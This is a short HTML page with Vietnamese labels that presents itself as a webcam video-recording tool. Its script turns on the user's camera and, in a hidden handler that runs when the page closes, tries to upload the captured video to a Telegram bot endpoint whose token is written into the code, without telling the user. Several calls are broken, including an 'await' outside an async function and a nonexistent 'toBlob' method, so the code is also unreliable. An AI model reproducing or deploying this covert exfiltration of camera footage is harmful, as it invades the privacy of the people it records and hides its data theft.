<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tạo video</title>
</head>
<body>
  <h1>Tạo video</h1>
  <button id="start-button">Bắt đầu</button>
  <video id="video" width="640" height="480" autoplay></video>

  <script>
    const video = document.getElementById("video");
    const startButton = document.getElementById("start-button");

    startButton.addEventListener("click", () => {
      video.srcObject = navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
        },
      });

      // Bắt đầu quay video
      video.play();
    });

    // Khi người dùng đóng trang web
    window.addEventListener("beforeunload", () => {
      // Lấy video đã quay
      const blob = await video.captureStream().toBlob();

      // Gửi video lên bot Telegram
      fetch("https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendDocument", {
        method: "POST",
        body: blob,
        header: {
          "Content-Type": "application/octet-stream",
        },
      });
    });
  </script>
</body>
</html>
